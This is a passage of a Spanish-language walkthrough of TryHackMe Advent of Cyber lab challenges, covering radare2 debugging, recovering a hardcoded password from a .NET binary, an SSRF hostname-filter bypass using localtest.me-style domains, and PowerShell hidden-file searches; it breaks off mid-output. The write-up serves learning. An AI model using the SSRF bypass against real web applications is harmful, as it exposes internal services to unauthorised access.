</div><p>Para resolver la primera pregunta debemos de ubicarnos donde se encuentra la instruccion <code>mov</code>, donde agregámos un <em>breakpoint</em> para que cuando ejecutemos el programa, este haga una pausa y poder analisar el valor de <code>local_ch</code>. Tambien necesitamos la direccion en memoria de <code>local_ch</code> (las primeras lineas de la funcion <code>main</code>) que tiene como valor <code>rbp-0xc</code>. En el siguiente codigo se muestran ambas lineas.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="p">;</span> var int local_ch @ rbp-0xc
<span class="o">[</span>... snip ...<span class="o">]</span>
<span class="p">|</span>           0x00400b51      c745f4010000.  mov dword <span class="o">[</span>local_ch<span class="o">]</span>, <span class="m">1</span>
</code></pre></td></tr></table>
</div>
</div><p>Para agregar un <em>breakpoint</em> lo realizamos con el &ldquo;comando&rdquo; <code>db direcciondememoria</code>, quedaria de la siguiente forma: <code>db 0x00400b51</code>, ejecutamos el programa con el &ldquo;comando&rdquo; <code>dc</code>, vemos un mensaje que la ejecucion está en &ldquo;pausa&rdquo; en la direccion <code>400b51</code> (la indicada con <code>db 0x00400b51</code>) y al mostrar el codigo (<code>pdf @sym.main</code>) vemos resaltada la direccion de memoria y el <em>breakpoint</em> (una pequeña <strong>b</strong>).<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1715.57.20.png" alt="image" /></p>
<p>Si revisamos el valor actual de <code>local_ch</code> vemos que es <code>0000</code> , porque la direccion de memoria a la que estamos realizando lectura hace referencia al valor inicial al inicio de la funcion <code>main</code> (<code>; var int local_ch @ rbp-0xc</code>) es por ello que hay que realizar un &ldquo;paso siguiente&rdquo; con el &ldquo;comando&rdquo; <code>ds</code> para obtener el valor de <code>local_ch</code>. Vemos que su valor es <code>0100</code>.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1716.13.51.png" alt="image" /></p>
<p>Para la segunda pregunta creamos un <em>breakpoint</em> en la direccion de memoria de la instruccion <code>imul</code> (<code>db 0x00400b62</code>).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="p">|</span>           0x00400b62      0faf45f8       imul eax, dword <span class="o">[</span>local_8h<span class="o">]</span>
</code></pre></td></tr></table>
</div>
</div><p>Nuevamente vemos el <em>breakpoint</em>, realizamos un &ldquo;paso siguiente&rdquo; (<code>ds</code>) y la lectura del valor de <code>eax</code> con el &ldquo;comando&rdquo; <code>dr</code> (valor de <code>rax</code>).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>0x00400a30<span class="o">]</span>&gt; db 0x00400b62
<span class="o">[</span>0x00400a30<span class="o">]</span>&gt; dc
hit breakpoint at: 400b62
<span class="o">[</span>0x00400b62<span class="o">]</span>&gt; pdf @main
            <span class="p">;</span>-- main:
/ <span class="o">(</span>fcn<span class="o">)</span> sym.main <span class="m">35</span>
<span class="p">|</span>   sym.main <span class="o">()</span><span class="p">;</span>
<span class="p">|</span>           <span class="p">;</span> var int local_ch @ rbp-0xc
<span class="p">|</span>           <span class="p">;</span> var int local_8h @ rbp-0x8
<span class="p">|</span>           <span class="p">;</span> var int local_4h @ rbp-0x4
<span class="p">|</span>              <span class="p">;</span> DATA XREF from 0x00400a4d <span class="o">(</span>entry0<span class="o">)</span>
<span class="p">|</span>           0x00400b4d      <span class="m">55</span>             push rbp
<span class="p">|</span>           0x00400b4e      4889e5         mov rbp, rsp
<span class="p">|</span>           0x00400b51      c745f4010000.  mov dword <span class="o">[</span>local_ch<span class="o">]</span>, <span class="m">1</span>
<span class="p">|</span>           0x00400b58      c745f8060000.  mov dword <span class="o">[</span>local_8h<span class="o">]</span>, <span class="m">6</span>
<span class="p">|</span>           0x00400b5f      8b45f4         mov eax, dword <span class="o">[</span>local_ch<span class="o">]</span>
<span class="p">|</span>           <span class="p">;</span>-- rip:
<span class="p">|</span>           0x00400b62 b    0faf45f8       imul eax, dword <span class="o">[</span>local_8h<span class="o">]</span>
<span class="p">|</span>           0x00400b66      8945fc         mov dword <span class="o">[</span>local_4h<span class="o">]</span>, eax
<span class="p">|</span>           0x00400b69      b800000000     mov eax, <span class="m">0</span>
<span class="p">|</span>           0x00400b6e      5d             pop rbp
<span class="se">\ </span>          0x00400b6f      c3             ret
<span class="o">[</span>0x00400b62<span class="o">]</span>&gt; ds
<span class="o">[</span>0x00400b62<span class="o">]</span>&gt; dr
<span class="nv">rax</span> <span class="o">=</span> 0x00000006
<span class="nv">rbx</span> <span class="o">=</span> 0x00400400

<span class="o">[</span> ... snip ... <span class="o">]</span>

<span class="o">[</span>0x00400b62<span class="o">]</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>Para resolver la ultima pregunta debemos de crear un <em>breakpoint</em> en:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="p">|</span>           0x00400b69      b800000000     mov eax, <span class="m">0</span>
</code></pre></td></tr></table>
</div>
</div><p>Y obtener el valor de <code>local_4h</code> (<code>rbp-0x4</code>).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>0x00400a30<span class="o">]</span>&gt; pdf @main
            <span class="p">;</span>-- main:
/ <span class="o">(</span>fcn<span class="o">)</span> sym.main <span class="m">35</span>
<span class="p">|</span>   sym.main <span class="o">()</span><span class="p">;</span>
<span class="p">|</span>           <span class="p">;</span> var int local_ch @ rbp-0xc
<span class="p">|</span>           <span class="p">;</span> var int local_8h @ rbp-0x8
<span class="p">|</span>           <span class="p">;</span> var int local_4h @ rbp-0x4
<span class="p">|</span>              <span class="p">;</span> DATA XREF from 0x00400a4d <span class="o">(</span>entry0<span class="o">)</span>
<span class="p">|</span>           0x00400b4d      <span class="m">55</span>             push rbp
<span class="p">|</span>           0x00400b4e      4889e5         mov rbp, rsp
<span class="p">|</span>           0x00400b51      c745f4010000.  mov dword <span class="o">[</span>local_ch<span class="o">]</span>, <span class="m">1</span>
<span class="p">|</span>           0x00400b58      c745f8060000.  mov dword <span class="o">[</span>local_8h<span class="o">]</span>, <span class="m">6</span>
<span class="p">|</span>           0x00400b5f      8b45f4         mov eax, dword <span class="o">[</span>local_ch<span class="o">]</span>
<span class="p">|</span>           0x00400b62      0faf45f8       imul eax, dword <span class="o">[</span>local_8h<span class="o">]</span>
<span class="p">|</span>           0x00400b66      8945fc         mov dword <span class="o">[</span>local_4h<span class="o">]</span>, eax
<span class="p">|</span>           0x00400b69      b800000000     mov eax, <span class="m">0</span>
<span class="p">|</span>           0x00400b6e      5d             pop rbp
<span class="se">\ </span>          0x00400b6f      c3             ret
<span class="o">[</span>0x00400a30<span class="o">]</span>&gt; db 0x00400b69
<span class="o">[</span>0x00400a30<span class="o">]</span>&gt; dc
hit breakpoint at: 400b69
<span class="o">[</span>0x00400b69<span class="o">]</span>&gt; pdf @main
            <span class="p">;</span>-- main:
/ <span class="o">(</span>fcn<span class="o">)</span> sym.main <span class="m">35</span>
<span class="p">|</span>   sym.main <span class="o">()</span><span class="p">;</span>
<span class="p">|</span>           <span class="p">;</span> var int local_ch @ rbp-0xc
<span class="p">|</span>           <span class="p">;</span> var int local_8h @ rbp-0x8
<span class="p">|</span>           <span class="p">;</span> var int local_4h @ rbp-0x4
<span class="p">|</span>              <span class="p">;</span> DATA XREF from 0x00400a4d <span class="o">(</span>entry0<span class="o">)</span>
<span class="p">|</span>           0x00400b4d      <span class="m">55</span>             push rbp
<span class="p">|</span>           0x00400b4e      4889e5         mov rbp, rsp
<span class="p">|</span>           0x00400b51      c745f4010000.  mov dword <span class="o">[</span>local_ch<span class="o">]</span>, <span class="m">1</span>
<span class="p">|</span>           0x00400b58      c745f8060000.  mov dword <span class="o">[</span>local_8h<span class="o">]</span>, <span class="m">6</span>
<span class="p">|</span>           0x00400b5f      8b45f4         mov eax, dword <span class="o">[</span>local_ch<span class="o">]</span>
<span class="p">|</span>           0x00400b62      0faf45f8       imul eax, dword <span class="o">[</span>local_8h<span class="o">]</span>
<span class="p">|</span>           0x00400b66      8945fc         mov dword <span class="o">[</span>local_4h<span class="o">]</span>, eax
<span class="p">|</span>           <span class="p">;</span>-- rip:
<span class="p">|</span>           0x00400b69 b    b800000000     mov eax, <span class="m">0</span>
<span class="p">|</span>           0x00400b6e      5d             pop rbp
<span class="se">\ </span>          0x00400b6f      c3             ret
<span class="o">[</span>0x00400b69<span class="o">]</span>&gt; px @ rbp-0x4
- offset -       <span class="m">0</span> <span class="m">1</span>  <span class="m">2</span> <span class="m">3</span>  <span class="m">4</span> <span class="m">5</span>  <span class="m">6</span> <span class="m">7</span>  <span class="m">8</span> <span class="m">9</span>  A B  C D  E F  0123456789ABCDEF
0x7fff5ff5ce7c  <span class="m">0600</span> <span class="m">0000</span> <span class="m">4018</span> <span class="m">4000</span> <span class="m">0000</span> <span class="m">0000</span> e910 <span class="m">4000</span>  ....@.@.......@.
0x7fff5ff5ce8c  <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  ................
0x7fff5ff5ce9c  <span class="m">0100</span> <span class="m">0000</span> a8cf f55f ff7f <span class="m">0000</span> 4d0b <span class="m">4000</span>  ......._....M.@.
0x7fff5ff5ceac  <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0600</span> <span class="m">0000</span>  ................
0x7fff5ff5cebc  <span class="m">5500</span> <span class="m">0000</span> <span class="m">5000</span> <span class="m">0000</span> <span class="m">0700</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  U...P...........
0x7fff5ff5cecc  <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  ................
0x7fff5ff5cedc  <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  ................
0x7fff5ff5ceec  <span class="m">0000</span> <span class="m">0000</span> <span class="m">0004</span> <span class="m">4000</span> <span class="m">0000</span> <span class="m">0000</span> f9c4 2eff  ......@.........
0x7fff5ff5cefc  5fdd <span class="m">6099</span> e018 <span class="m">4000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  _.<span class="sb">`</span>...@.........
0x7fff5ff5cf0c  <span class="m">0000</span> <span class="m">0000</span> <span class="m">1890</span> 6b00 <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  ......k.........
0x7fff5ff5cf1c  <span class="m">0000</span> <span class="m">0000</span> f9c4 8e52 <span class="m">3462</span> 9e66 f9c4 9aee  .......R4b.f....
0x7fff5ff5cf2c  5fdd <span class="m">6099</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  _.<span class="sb">`</span>.............
0x7fff5ff5cf3c  <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  ................
0x7fff5ff5cf4c  <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  ................
0x7fff5ff5cf5c  <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  ................
0x7fff5ff5cf6c  <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  ................
<span class="o">[</span>0x00400b69<span class="o">]</span>&gt;
</code></pre></td></tr></table>
</div>
</div><h1 id="day-18---reverse-engineering-">DAY 18 - Reverse Engineering</h1>
<p>Continuando con Ingenieria Inversa, esta vez con un archivo escrito en .NET, para su analisis utilizamos la herramienta que provee THM: <a href="https://github.com/icsharpcode/ILSpy"><strong>ILSpy</strong></a>, en la maquina ofrecida en el reto del dia.</p>
<p>Al ejecutar el archivo pregunta por una contraseña, y al ingresar un string cualquiera nos muestra un mensaje.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1821.06.00.png" alt="image" /><br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1821.06.41.png" alt="image" /></p>
<p>Utilizando <a href="https://github.com/icsharpcode/ILSpy"><strong>ILSpy</strong></a> para analizar el archivo vemos varias funciones de la aplicacion dentro del Formulario principal que manejan los diferentes componentes como botones, labels, textbox, etc., una de estas analiza que la contraseña ingresada sea a la misma que se encuentra en un &ldquo;Array&rdquo;. Tambien se logra ver los mensaje de cuando la contraseña es incorrecta y correcta.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1821.16.37.png" alt="image" /></p>
<p>Al dirigirnos al <em>&ldquo;array&rdquo;</em> que contiene la contraseña, aunque no aparece en texto plano la informacion que se encuentra comentada (<em>data(&hellip;)</em>) podria darnos el valor ya que el la aplicacion no logra obtener dicho valor.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1821.18.04.png" alt="image" /></p>
<p>La informacion esta en <code>hexadecimal</code> por lo que al <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&amp;input=NzMgNjEgNkUgNzQgNjEgNzAgNjEgNzMgNzMgNzcgNkYgNzIgNjQgMzMgMzIgMzEgMDA"><strong>decodificarlo</strong></a> vemos la contraseña. El valor final <code>00</code> se omite ya que hace referencia al final del <em>&ldquo;string&rdquo;</em>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="m">73</span> <span class="m">61</span> 6E <span class="m">74</span> <span class="m">61</span> <span class="m">70</span> <span class="m">61</span> <span class="m">73</span> <span class="m">73</span> <span class="m">77</span> 6F <span class="m">72</span> <span class="m">64</span> <span class="m">33</span> <span class="m">32</span> <span class="m">31</span> 
santapassword321
</code></pre></td></tr></table>
</div>
</div><p>Ingresamos la contraseña encontrada y vemos un mensaje junto con nuestra flag.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1821.33.48.png" alt="image" /></p>
<h1 id="day-19---the-naughty-or-nice-list-">DAY 19 - The Naughty or Nice List</h1>
<p>La descripcion del reto del dia indica que la aplicacion web es vulnerable a <strong>Server-Side Request Forgery</strong> (SSRF) y que al hacer <em>bypass</em> al filtro de hostname debemos utilizar <strong>localtest.me</strong> para que funcione. Al visitar la aplicacion vemos una caja de busqueda y tambien un formulario para ingresar credenciales.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1913.30.24.png" alt="image" /><br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1913.32.17.png" alt="image" /></p>
<p>Al revisar el codigo fuente vemos que la caja de busqueda realiza la ejecucion de la funcion <code>checkList()</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-lg-6 col-md-6 col-sm-12&#34;</span><span class="p">&gt;</span>
   Welcome children!<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
   To find out if you are currently on the naughty list or the nice list, please enter your name below!<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
   Have a Merry Christmas! Ho ho ho!<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
   - Santa<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
   <span class="p">&lt;</span><span class="nt">form</span> <span class="na">onsubmit</span><span class="o">=</span><span class="s">&#34;checkList(); return false&#34;</span><span class="p">&gt;</span>
      Name: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;name&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;name&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Search&#34;</span><span class="p">&gt;</span>
   <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
   <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
      <span class="kd">function</span> <span class="nx">checkList</span><span class="p">()</span>
      <span class="p">{</span>
              <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&#34;/?proxy=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="s2">&#34;http://list.hohoho:8080/search.php?name=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">).</span><span class="nx">value</span><span class="p">)));</span>
      <span class="p">}</span>
   <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
   <span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>La funcion realiza la codificacion de la direccion <code>http://list.hohoho:8080/search.php?name=</code> a URI junto con la codificacion (URI) del valor ingresado en la cajita que tiene como <code>id</code> el valor <code>name</code>, al finalizar esta codificacion creada se pasa como valor del parametro <code>proxy</code> en la pagina principal, de tal forma que quedaria de la siguiente forma si el valor a buscar fuera <code>santa.com</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&#34;/?proxy=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="s2">&#34;http://list.hohoho:8080/search.php?name=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">).</span><span class="nx">value</span><span class="p">)));</span>
<span class="c1">// /?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3Dsanta.com
</span></code></pre></td></tr></table>
</div>
</div><p>Al realizar cualquier busqueda (ej. <em>batman</em>) este retorna el mensaje <strong>batman is on the Nice List.</strong>, si se realiza una busqueda sin valor solo retorna <strong>is on the Nice List.</strong>, dicha busqueda se pasa a una &ldquo;<strong>pagina interna</strong>&quot;: <code>http://list.hohoho:8080</code> a la cual seguramente realiza una solicitud.</p>
<p>Si enviamos el puerto incorrecto (ej. <em>http%3A%2F%2Flist.hohoho%3A80%2Fsearch.php%3Fname%3Dbatman</em>) este nos retorna el valor <code>Failed to connect to list.hohoho port 80: Connection refused</code>, si cambiamos el valor de la pagina list.hohoho a una IP retorna <code>Your search has been blocked by our security team.</code> lo que indica que la aplicacion verifica o filtra que el valor de &ldquo;proxy&rdquo; sea <code>list.hohoho</code>, de igual forma con algun otro dominio.</p>
<p>Como sabemos la aplicacion es vulnerable a <em>SSRF</em> por lo que es posible realizar <code>bypass</code> al filtro de <code>list.hohoho</code> utilizando <strong>localtest.me</strong> agregando este ultimo a la direccion aceptada por la pagina: <code>list.hohoho.localtest.me</code>, existen otros valores que pueden ser reemplazados por <code>localtest.me</code>: <code>lvh.me</code> y <code>vcap.me</code>.</p>
<p>Al realizar la solicitud a esta nueva direccion se muestra un nuevo mensaje en la pagina y contiene informacion para el panel que se encuentra en la pagina:<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1914.25.16.png" alt="image" /></p>
<p>Al ingresar con la contraseña y el usuario el cual tambien se define en el mensaje nos redirecciona a una nueva pagina, al pulsar el boton en esta nos muestra nuestra flag final.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1914.27.39.png" alt="image" /><br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1914.28.15.png" alt="image" /></p>
<ul>
<li><a href="https://portswigger.net/web-security/ssrf"><strong>SSRF - POSTWIGGER</strong></a></li>
</ul>
<h1 id="day-20----powershellf-to-the-rescue-">DAY 20 -  PowershELlF to the rescue</h1>
<p>El reto del dia incluye utilizar PowerShell y encontrar archivos y strings dentro de estos, la informacion en la descripcion del reto es suficiente para resolver las tareas. Para la primera tarea nos ubicamos en la direccion de <code>Documents</code> y realizamos la busqueda de un archivo oculto.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager&gt; Set-Location Documents<span class="se">\ </span>
PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="se">\D</span>ocuments&gt; Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue 


    Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-        12/7/2020  10:29 AM            <span class="m">402</span> desktop.ini
-arh--       11/18/2020   5:05 PM             <span class="m">35</span> e1fone.txt


PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="se">\D</span>ocuments&gt; Get-Content e1fone.txt 
All I want is my <span class="s1">&#39;2 front teeth&#39;</span>!!! 
PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="se">\D</span>ocuments&gt;
</code></pre></td></tr></table>
</div>
</div><p>Para la segunda tarea, realizamos de manera similar que la primera tarea pero en este caso buscamos un <code>folder</code> o <code>directorio</code> que especificamos con <code>-Directory</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager&gt; Set-Location -Path Desktop<span class="se">\
</span><span class="se"></span>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="se">\D</span>esktop&gt; Get-ChildItem -Directory -Hidden -ErrorAction SilentlyContinue


    Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/7/2020  11:26 AM                elf2wo


PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="se">\D</span>esktop&gt; Get-ChildItem -File -Path elf2wo<span class="se">\ </span>-ErrorAction SilentlyContinue


    Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="se">\D</span>esktop<span class="se">\e</span>lf2wo


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/17/2020  10:26 AM             <span class="m">64</span> e70smsW10Y4k.txt


PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="se">\D</span>esktop&gt; Get-Content elf2wo<span class="se">\e</span>70smsW10Y4k.txt
I want the movie Scrooged &lt;3! 
PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="se">\D</span>esktop&gt;
</code></pre></td></tr></table>
</div>
</div><p>Para la tercera tarea nos pide que realicemos la busqueda de un directorio oculto en <code>C:\Windows</code>, como sabemos este directorio contiene un centenar de archivos por lo que al realizar la busqueda de la misma manera que en la segunda tarea nos retornaria una gran cantidad de directorios, si nos fijamos en los archivos y directorios que encontramos contienen un numero representado por el numero de tarea en este caso seria el numero <em>3</em> el cual utilizamos para filtrar los archivos que solo contengan este numero.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\W</span>indows&gt; Get-ChildItem -Directory -Recurse -Filter <span class="s1">&#39;*3*&#39;</span> -Hidden -ErrorAction SilentlyContinue


    Directory: C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
